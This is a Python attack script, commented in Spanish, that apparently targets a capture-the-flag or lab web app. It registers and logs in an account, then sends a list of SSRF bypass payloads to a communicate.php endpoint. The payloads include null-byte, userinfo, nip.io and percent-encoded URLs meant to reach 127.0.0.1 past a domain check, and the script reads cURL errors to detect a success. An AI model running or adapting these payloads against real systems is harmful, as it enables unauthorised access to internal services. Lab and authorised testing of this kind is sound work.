#!/usr/bin/env python3
"""
Probar protocol confusion en curl
"""
import requests
import random
import string

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

session = requests.Session()
username = random_string()
password = random_string()

data = {'name': 'user1', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

print(f"[*] Usuario: {username}:{password}\n")

# Probar diferentes protocolos que podrían confundir a curl
test_urls = [
    ("http://0.motherland.com/", "0 subdomain"),
    ("http://00.motherland.com/", "00 subdomain"),
    ("http://localhost@motherland.com/", "localhost user"),
    ("http://127.0.0.1%00.motherland.com/", "Null byte"),
    ("http://motherland.com.127.0.0.1.nip.io/", "nip.io redirect"),
    ("http://motherland.com.localhost/", "Compound domain"),
    ("http://motherland.com%2f@127.0.0.1/", "Encoded slash"),
    ("http://motherland.com%3f@127.0.0.1/", "Encoded question"),
    ("http://motherland.com%23@127.0.0.1/", "Encoded hash"),
]

for url, desc in test_urls:
    print(f"[*] {desc}: {url}")
    data = {
        'url': url,
        'data[action]': 'edit',
        'data[new_name]': 'PAYLOAD'
    }
    
    try:
        resp = session.post(f"{TARGET}/communicate.php", data=data, timeout=10)
        
        if "Wrong URL" in resp.text:
            print(f"    [-] Wrong URL")
        elif "Failed when parsing" in resp.text:
            print(f"    [-] Failed parsing")
        elif "cURL Error" in resp.text:
            import re
            match = re.search(r'cURL Error: ([^<]+)', resp.text)
            if match:
                error = match.group(1).strip()
                if "timed out" in error.lower():
                    print(f"    [-] Timeout")
                elif "Couldn't resolve" in error or "resolve" in error.lower():
                    print(f"    [-] DNS error: {error[:60]}")
                else:
                    print(f"    [!] DIFERENTE: {error[:60]}")
        else:
            print(f"    [?] Respuesta inesperada ({len(resp.text)} bytes)")
            
    except Exception as e:
        print(f"    [!] Exception: {str(e)[:60]}")
    
    print()
